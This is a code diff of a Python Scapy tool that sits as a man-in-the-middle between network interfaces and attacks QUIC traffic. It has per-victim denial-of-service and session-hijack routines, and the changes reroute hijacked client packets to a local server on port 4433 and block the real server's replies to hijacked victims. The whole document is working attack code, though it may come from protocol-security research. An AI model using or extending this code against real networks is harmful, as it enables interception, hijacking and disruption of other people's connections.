@@ -51,12 +51,11 @@ def dos_attack(victim, version = QuicProtocolVersion.VERSION_1):
 
 def sh_attack1(pkt):
     new_pkt = pkt[IP]
-    new_pkt[IP].dest = attacker_inner_iface_ip
+    new_pkt[IP].dst = "127.0.0.1"
     new_pkt[UDP].dport = 4433
     del new_pkt.getlayer(IP).chksum
     del new_pkt.getlayer(UDP).chksum
-    #print(f"New PKT to server: {new_pkt.summary()}")
-    send(new_pkt, iface=inner_iface, verbose=False)
+    send(new_pkt, iface="lo", verbose=False)
 
 def handle_quic(pkt):
     global vs
@@ -67,14 +66,13 @@ def handle_quic(pkt):
         if pkt.sniffed_on == inner_iface:
             vs.update(pkt)
             if QUIC_Initial in pkt:
-                #print(f"Quic Init in version: {pkt[QUIC_Initial].Version}")
                 
                 if (vs[pkt[IP].src].status["DoS"] or vs[pkt[IP].src][pkt[IP].dst]["DoS"]):
                     dos_attack(pkt, QuicProtocolVersion(pkt[QUIC_Initial].Version))
                     return
             if QUIC in pkt and (vs[pkt[IP].src].status["Session Hijack"] or vs[pkt[IP].src][pkt[IP].dst]["Session Hijack"]):
                 sh_attack1(pkt)
-                print("Sent shit")
+                return
             add_and_send_to_server(pkt)
             
             
@@ -82,13 +80,11 @@ def handle_quic(pkt):
                     
         elif pkt.sniffed_on == outer_iface:
             new_dst = vs.find_victim_from_wan(pkt[IP].src, pkt[UDP].dport)
-            if new_dst != "":
-                #print(f"From server: {pkt.summary()}")
+            if new_dst != "" and not vs[new_dst][pkt[IP].src]["Session Hijack"]:
                 new_pkt = pkt[IP]
                 new_pkt[IP].dst = new_dst
                 del new_pkt.getlayer(IP).chksum
                 del new_pkt.getlayer(UDP).chksum
-                #print(f"New PKT to client: {new_pkt.summary()}")
                 send(new_pkt, iface=inner_iface, verbose=False)
             #else:
                 #print("A packet of unknown LAN destination.")
@@ -135,14 +131,14 @@ if __name__ == "__main__":
     ##TODO: add changing of those while running 
     inner_iface = args.inner_iface
     try:
-        attacker_inner_iface_ip = IPv4Address(args.inner_iface_ip)
+        attacker_inner_iface_ip = str(IPv4Address(args.inner_iface_ip))
     except Exception as e:
         print(e)
         os.system('sysctl -w net.ipv4.ip_forward=1')
         os._exit(1)
     outer_iface = args.outer_iface
     try:
-        attacker_outer_iface_ip = IPv4Address(args.outer_iface_ip)
+        attacker_outer_iface_ip = str(IPv4Address(args.outer_iface_ip))
     except Exception as e:
         print(e)
         os.system('sysctl -w net.ipv4.ip_forward=1')
